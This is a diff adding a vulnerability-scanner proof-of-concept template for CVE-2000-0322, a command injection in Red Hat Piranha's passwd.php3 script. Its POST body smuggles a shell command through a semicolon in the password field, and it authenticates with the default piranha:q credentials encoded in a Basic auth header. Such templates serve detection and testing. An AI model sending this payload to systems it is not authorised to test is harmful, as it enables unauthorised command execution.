@@ -1,0 +1,33 @@
+[info]
+author = "ave"
+description = "Red Hat Piranha 虚拟服务器套件 passwd.php3 CGI 脚本命令注入漏洞验证。脚本对用户输入参数未做过滤，允许通过 shell 元字符（如分号、管道符）注入任意命令。默认管理凭据 piranha:q 使攻击者可以认证后利用该漏洞。发送 POST 请求携带命令注入 payload，检测命令执行返回结果。"
+id = "POC-AVE-2000-0267"
+name = "CVE-2000-0322 PoC"
+severity = "critical"
+tags = ["ave-2000-0267"]
+vuln_id = [
+    "CVE-2000-0322",
+    "AVE-2000-0267",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/piranha/secure/passwd.php3"
+protocol = "http"
+
+[poc.requests.body]
+content = "user=admin&password=test%3Bid"
+type = "raw"
+
+[poc.requests.headers]
+Authorization = "Basic cGlyYW5oYTpx"
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["uid="]
